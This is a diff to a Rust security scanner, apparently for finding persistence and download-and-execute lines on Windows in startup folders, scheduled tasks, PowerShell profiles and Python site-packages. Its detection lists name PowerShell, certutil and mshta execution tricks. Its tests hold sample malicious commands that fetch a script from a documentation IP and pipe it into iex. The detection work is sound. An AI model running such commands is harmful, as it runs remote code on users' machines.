@@ -56,15 +56,52 @@ fn clip(s: &str, n: usize) -> String {
     }
 }
 
+/// Windows でダウンロードに使われるもの（小文字で比べる）
+const WIN_NETWORK: &[&str] = &[
+    "curl.exe",
+    "wget.exe",
+    "invoke-webrequest",
+    "iwr ",
+    "irm ",
+    "invoke-restmethod",
+    "downloadstring",
+    "downloadfile",
+    "net.webclient",
+    "start-bitstransfer",
+    "bitsadmin",
+    "certutil -urlcache",
+    "certutil.exe -urlcache",
+];
+/// Windows でその場のコードを動かす形
+const WIN_INLINE: &[&str] = &[
+    "-encodedcommand",
+    " -enc ",
+    " -ec ",
+    "iex(",
+    "iex (",
+    "invoke-expression",
+    "mshta javascript:",
+    "mshta vbscript:",
+    "mshta.exe javascript:",
+    "mshta.exe vbscript:",
+    "rundll32 javascript:",
+    "rundll32.exe javascript:",
+    "scrobj.dll",
+];
+/// Windows の一時フォルダ
+const WIN_TMP: &[&str] = &["\\temp\\", "%temp%", "$env:temp", "\\appdata\\local\\temp", "\\users\\public\\"];
+
 /// コマンドの文字列から怪しい特徴を拾う
 pub fn risky_flags(cmd: &str) -> Vec<String> {
     let c = cmd.to_ascii_lowercase();
     let mut v = vec![];
     let has = |pats: &[&str]| pats.iter().any(|p| c.contains(p));
-    if has(&["curl ", "wget ", "http://", "https://", "nc ", "ncat ", "socat "]) {
+    if has(&["curl ", "wget ", "http://", "https://", "nc ", "ncat ", "socat "]) || has(WIN_NETWORK) {
         v.push("network");
     }
-    if has(&["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh", "| python", "|python", "| node", "|node"]) {
+    if has(&["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh", "| python", "|python", "| node", "|node"])
+        || has(&["| iex", "|iex", "| invoke-expression", "|invoke-expression"])
+    {
         v.push("pipe_shell");
     }
     if has(&[
@@ -78,13 +115,14 @@ pub fn risky_flags(cmd: &str) -> Vec<String> {
         "eval ",
         "eval(",
         "exec(",
-    ]) {
+    ]) || has(WIN_INLINE)
+    {
         v.push("inline_code");
     }
-    if has(&["base64", "frombase64", "atob("]) {
+    if has(&["base64", "frombase64", "atob(", " -enc ", " -encodedcommand ", " -ec "]) {
         v.push("base64");
     }
-    if has(&["/tmp/", "/var/tmp/", "/private/tmp/", "/dev/shm/"]) {
+    if has(&["/tmp/", "/var/tmp/", "/private/tmp/", "/dev/shm/"]) || has(WIN_TMP) {
         v.push("tmp_path");
     }
     v.into_iter().map(str::to_string).collect()
@@ -174,8 +212,22 @@ pub fn strip_jsonc(s: &str) -> String {
 }
 
 /// バイト列を UTF-8 として読む（バイト単位のコメント除去で多バイト文字が壊れないよう、先に文字列にする）
-fn text_of(data: &[u8]) -> String {
-    String::from_utf8_lossy(data).into_owned()
+/// ファイルの中身を文字列にする。BOM 付きの UTF-16（Windows のタスク スケジューラの XML 等）と
+/// BOM 付きの UTF-8 も読む。それ以外は UTF-8 として読む（壊れた部分は置き換える）
+pub fn text_of(data: &[u8]) -> String {
+    let utf16 = |b: &[u8], le: bool| {
+        let u: Vec<u16> = b
+            .chunks_exact(2)
+            .map(|c| if le { u16::from_le_bytes([c[0], c[1]]) } else { u16::from_be_bytes([c[0], c[1]]) })
+            .collect();
+        String::from_utf16_lossy(&u)
+    };
+    match data {
+        [0xFF, 0xFE, rest @ ..] => utf16(rest, true),
+        [0xFE, 0xFF, rest @ ..] => utf16(rest, false),
+        [0xEF, 0xBB, 0xBF, rest @ ..] => String::from_utf8_lossy(rest).into_owned(),
+        _ => String::from_utf8_lossy(data).into_owned(),
+    }
 }
 
 /// `.claude/settings*.json` の hooks：（イベント名: コマンド）の一覧
@@ -273,7 +325,15 @@ pub fn is_download_exec(line: &str) -> bool {
     let has = |x: &str| f.iter().any(|v| v == x);
     let fetch = ["curl ", "wget ", "fetch("].iter().any(|p| l.contains(p));
     let subst = ["$(curl", "$(wget", "`curl", "`wget", "<(curl", "<(wget"].iter().any(|p| l.contains(p));
-    (fetch && has("pipe_shell")) || subst || (has("base64") && (has("pipe_shell") || has("inline_code")))
+    // PowerShell：iex (iwr …)、(New-Object Net.WebClient).DownloadString(…) | iex 等
+    let ps_fetch = ["invoke-webrequest", "iwr ", "irm ", "invoke-restmethod", "downloadstring", "net.webclient"]
+        .iter()
+        .any(|p| l.contains(p));
+    let ps_exec = ["iex", "invoke-expression"].iter().any(|p| l.contains(p));
+    (fetch && has("pipe_shell"))
+        || subst
+        || (ps_fetch && ps_exec)
+        || (has("base64") && (has("pipe_shell") || has("inline_code")))
 }
 
 /// シェルの rc のうち、ダウンロードしてそのまま実行する行
@@ -373,6 +433,8 @@ fn whole_file(out: &mut Vec<Item>, kind: &str, p: &Path) {
                     let r = risky_flags(&cmd);
                     (format!("{name} → {cmd}"), r)
                 }
+                // Windows のスタートアップに置かれたスクリプト（.bat・.cmd・.ps1・.vbs・.js）は中身を見る
+                None if is_win_script(&name) => (name, risky_flags(&text)),
                 None => (name, vec![]),
             },
             _ => (name, risky_flags(&text)),
@@ -476,7 +538,12 @@ pub fn expand_dirs(base: &Path, parts: &[&str]) -> Vec<PathBuf> {
 
 /// 仮想環境（venv・conda の環境 等）の site-packages
 fn venv_sites(venv: &Path) -> Vec<PathBuf> {
-    expand_dirs(venv, &["lib", "python*", "site-packages"])
+    let mut v = expand_dirs(venv, &["lib", "python*", "site-packages"]);
+    // Windows の venv・python.org の Python は Lib\site-packages（python3.x の段が無い）
+    v.extend(expand_dirs(venv, &["Lib", "site-packages"]));
+    v.sort();
+    v.dedup();
+    v
 }
 
 /// 仮想環境の site-packages にある .pth
@@ -491,6 +558,9 @@ fn scan_venv(venv: &Path, out: &mut Vec<Item>, sites: &mut Vec<PathBuf>) {
 pub fn home_python_sites(home: &Path, os: &str) -> Vec<PathBuf> {
     let mut v = vec![];
     // pip install --user
+    if os == "windows" {
+        return home_python_sites_windows(home);
+    }
     if os == "macos" {
         v.extend(expand_dirs(home, &["Library", "Python", "*", "lib", "python", "site-packages"]));
     } else {
@@ -516,9 +586,37 @@ pub fn home_python_sites(home: &Path, os: &str) -> Vec<PathBuf> {
     v
 }
 
+/// Windows のホームの下の Python 環境（python.org の利用者ごとの導入・pip --user・pyenv-win・uv・pipx・conda・poetry）
+fn home_python_sites_windows(home: &Path) -> Vec<PathBuf> {
+    let mut v = expand_dirs(home, &["AppData", "Roaming", "Python", "Python*", "site-packages"]);
+    let mut envs: Vec<PathBuf> = vec![home.join(".venv")];
+    envs.extend(expand_dirs(home, &["AppData", "Local", "Programs", "Python", "Python*"]));
+    envs.extend(expand_dirs(home, &[".pyenv", "pyenv-win", "versions", "*"]));
+    envs.extend(expand_dirs(home, &["AppData", "Roaming", "uv", "tools", "*"]));
+    envs.extend(expand_dirs(home, &["AppData", "Roaming", "uv", "python", "*"]));
+    envs.extend(expand_dirs(home, &["pipx", "venvs", "*"]));
+    envs.extend(expand_dirs(home, &[".local", "pipx", "venvs", "*"]));
+    for conda in ["miniconda3", "anaconda3", "miniforge3", "mambaforge", ".conda"] {
+        let c = home.join(conda);
+        envs.push(c.clone());
+        envs.extend(expand_dirs(&c, &["envs", "*"]));
+    }
+    envs.extend(expand_dirs(home, &["AppData", "Local", "pypoetry", "Cache", "virtualenvs", "*"]));
+    for e in envs {
+        v.extend(venv_sites(&e));
+    }
+    v
+}
+
 /// システム全体の Python の site-packages（Homebrew・python.org の Framework・ディストリの Python 等）
 pub fn global_python_sites(os: &str) -> Vec<PathBuf> {
     let mut v = vec![];
+    if os == "windows" {
+        for root in ["C:\\", "C:\\Program Files", "C:\\Program Files (x86)"] {
+            v.extend(expand_dirs(Path::new(root), &["Python*", "Lib", "site-packages"]));
+        }
+        return v;
+    }
     let root = Path::new("/");
     if os == "macos" {
         v.extend(expand_dirs(root, &["opt", "homebrew", "lib", "python*", "site-packages"]));
@@ -568,7 +666,20 @@ fn scan_home(home: &Path, os: &str, out: &mut Vec<Item>, sites: &mut Vec<PathBuf
             push_items(out, "claude_hook", &fp, &d, items);
         }
     }
-    for rc in [".zshrc", ".zprofile", ".zshenv", ".bashrc", ".bash_profile", ".profile", ".config/fish/config.fish"] {
+    for rc in [
+        ".zshrc",
+        ".zprofile",
+        ".zshenv",
+        ".bashrc",
+        ".bash_profile",
+        ".profile",
+        ".config/fish/config.fish",
+        // PowerShell のプロファイル（起動のたびに実行される）
+        "Documents/WindowsPowerShell/profile.ps1",
+        "Documents/WindowsPowerShell/Microsoft.PowerShell_profile.ps1",
+        "Documents/PowerShell/profile.ps1",
+        "Documents/PowerShell/Microsoft.PowerShell_profile.ps1",
+    ] {
         let fp = home.join(rc);
         if let Some(d) = read_small(&fp) {
             let items = rc_pipe_lines(&text_of(&d));
@@ -577,6 +688,8 @@ fn scan_home(home: &Path, os: &str, out: &mut Vec<Item>, sites: &mut Vec<PathBuf
     }
     let autostart_dirs: Vec<PathBuf> = if os == "macos" {
         vec![home.join("Library/LaunchAgents")]
+    } else if os == "windows" {
+        vec![home.join(WIN_STARTUP_USER)]
     } else {
         vec![home.join(".config/systemd/user"), home.join(".config/autostart")]
     };
@@ -595,6 +708,10 @@ fn scan_home(home: &Path, os: &str, out: &mut Vec<Item>, sites: &mut Vec<PathBuf
 
 /// システム全体の自動起動（root で走査したときだけ読める場所もある）
 fn scan_system(os: &str, out: &mut Vec<Item>) {
+    if os == "windows" {
+        scan_system_windows(out);
+        return;
+    }
     let dirs: &[&str] = if os == "macos" {
         &["/Library/LaunchAgents", "/Library/LaunchDaemons"]
     } else {
@@ -610,6 +727,92 @@ fn scan_system(os: &str, out: &mut Vec<Item>) {
             }
         }
     }
+}
+
+fn is_win_script(name: &str) -> bool {
+    let n = name.to_ascii_lowercase();
+    [".bat", ".cmd", ".ps1", ".vbs", ".js", ".wsf", ".hta"].iter().any(|e| n.ends_with(e))
+}
+
+/// 利用者ごとのスタートアップ（ホームからの相対）
+pub const WIN_STARTUP_USER: &str = "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
+/// 全員のスタートアップ
+pub const WIN_STARTUP_ALL: &str = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp";
+/// タスク スケジューラの定義（XML、管理者で読める）
+pub const WIN_TASKS: &str = "C:\\Windows\\System32\\Tasks";
+
+/// タスク スケジューラの XML から「何を起動するか」を取り出す（Exec の Command・Arguments と、ComHandler の ClassId）
+pub fn task_command(xml: &str) -> Option<String> {
+    let mut cmds = vec![];
+    let tag = |s: &str, t: &str| -> Option<String> {
+        let open = format!("<{t}>");
+        let i = s.find(&open)?;
+        let rest = &s[i + open.len()..];
+        let end = rest.find(&format!("</{t}>"))?;
+        Some(xml_unescape(rest[..end].trim()))
+    };
+    let mut rest = xml;
+    while let Some(i) = rest.find("<Exec>") {
+        let body = &rest[i..];
+        let end = body.find("</Exec>").map(|e| e + 7).unwrap_or(body.len());
+        let block = &body[..end];
+        if let Some(c) = tag(block, "Command") {
+            let args = tag(block, "Arguments").unwrap_or_default();
+            cmds.push(if args.is_empty() { c } else { format!("{c} {args}") });
+        }
+        rest = &body[end..];
+    }
+    let mut rest = xml;
+    while let Some(i) = rest.find("<ComHandler>") {
+        let body = &rest[i..];
+        let end = body.find("</ComHandler>").map(|e| e + 13).unwrap_or(body.len());
+        if let Some(c) = tag(&body[..end], "ClassId") {
+            cmds.push(format!("COM {c}"));
+        }
+        rest = &body[end..];
+    }
+    (!cmds.is_empty()).then(|| clip(&cmds.join(" ; "), 300))
+}
+
+/// タスク スケジューラの定義を 1 件として記録する。登録日時などの書き換えで「変わった」と出ないよう、
+/// hash は起動するコマンドから作る
+fn task_item(out: &mut Vec<Item>, p: &Path) {
+    let Some(data) = read_small(p) else { return };
+    let text = text_of(&data);
+    let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
+    let (detail, hash, risky) = match task_command(&text) {
+        Some(cmd) => (format!("{name} → {cmd}"), sha(cmd.as_bytes()), risky_flags(&cmd)),
+        None => (name, sha(&data), vec![]),
+    };
+    out.push(Item { kind: "autostart".into(), path: p.display().to_string(), detail, hash, risky });
+}
+
+fn walk_tasks(dir: &Path, depth: usize, out: &mut Vec<Item>) {
+    if depth > 6 {
+        return;
+    }
+    let Ok(rd) = std::fs::read_dir(dir) else { return };
+    for e in rd.flatten() {
+        let Ok(ft) = e.file_type() else { continue };
+        if ft.is_dir() {
+            walk_tasks(&e.path(), depth + 1, out);
+        } else if ft.is_file() {
+            task_item(out, &e.path());
+        }
+    }
+}
+
+/// Windows のシステム全体の自動起動（ファイルで分かるもの）。レジストリの Run キーとサービスは kanmond が読む
+fn scan_system_windows(out: &mut Vec<Item>) {
+    if let Ok(rd) = std::fs::read_dir(WIN_STARTUP_ALL) {
+        for f in rd.flatten() {
+            let p = f.path();
+            if p.is_file() {
+                whole_file(out, "autostart", &p);
+            }
+        }
+    }
+    walk_tasks(Path::new(WIN_TASKS), 0, out);
 }
 
 /// 走査する。`roots` はプロジェクトのディレクトリ（深さ `max_depth` まで）、`homes` はユーザーのホーム
@@ -719,6 +922,55 @@ pub fn diff(old: &[Item], new: &[Item]) -> Vec<Change> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn windows_text_and_tasks() {
+        // タスク スケジューラの XML は BOM 付き UTF-16LE
+        let xml = r#"<?xml version="1.0" encoding="UTF-16"?><Task><Actions Context="Author">
+<Exec><Command>powershell.exe</Command><Arguments>-NoP -W Hidden -enc SQBFAFgA</Arguments></Exec>
+<Exec><Command>C:\Tools\a.exe</Command></Exec>
+<ComHandler><ClassId>{0000-1111}</ClassId></ComHandler></Actions></Task>"#;
+        let mut bytes = vec![0xFF, 0xFE];
+        for u in xml.encode_utf16() {
+            bytes.extend(u.to_le_bytes());
+        }
+        let text = text_of(&bytes);
+        let cmd = task_command(&text).unwrap();
+        assert_eq!(cmd, r"powershell.exe -NoP -W Hidden -enc SQBFAFgA ; C:\Tools\a.exe ; COM {0000-1111}");
+        let r = risky_flags(&cmd);
+        assert!(r.contains(&"inline_code".to_string()) && r.contains(&"base64".to_string()), "{r:?}");
+        assert_eq!(task_command("<Task><Actions/></Task>"), None);
+        assert_eq!(text_of(b"\xEF\xBB\xBFabc"), "abc");
+    }
+
+    #[test]
+    fn windows_risky_and_download_exec() {
+        let l = "iex (New-Object Net.WebClient).DownloadString('https://203.0.113.9/a.ps1')";
+        assert!(is_download_exec(l));
+        assert!(risky_flags(l).contains(&"network".to_string()));
+        assert!(is_download_exec("iwr https://203.0.113.9/x.ps1 | iex"));
+        assert!(!is_download_exec("Import-Module posh-git"));
+        assert!(risky_flags(r"cmd /c C:\Users\u\AppData\Local\Temp\x.exe").contains(&"tmp_path".to_string()));
+        assert!(risky_flags("certutil -urlcache -f http://203.0.113.9/a a.exe").contains(&"network".to_string()));
+        // 普通のコマンドには付けない
+        assert!(risky_flags(r"C:\Program Files\Vendor\updater.exe /silent").is_empty());
+    }
+
+    #[test]
+    fn windows_python_sites() {
+        let t = std::env::temp_dir().join(format!("kanmon-winpy-{}", std::process::id()));
+        let sp = t.join("AppData/Local/Programs/Python/Python312/Lib/site-packages");
+        let venv = t.join(".venv/Lib/site-packages");
+        let user = t.join("AppData/Roaming/Python/Python312/site-packages");
+        for d in [&sp, &venv, &user] {
+            std::fs::create_dir_all(d).unwrap();
+        }
+        let v = home_python_sites(&t, "windows");
+        for d in [&sp, &venv, &user] {
+            assert!(v.contains(d), "{d:?} が無い：{v:?}");
+        }
+        std::fs::remove_dir_all(&t).ok();
+    }
 
     #[test]
     fn claude_hooks_found() {
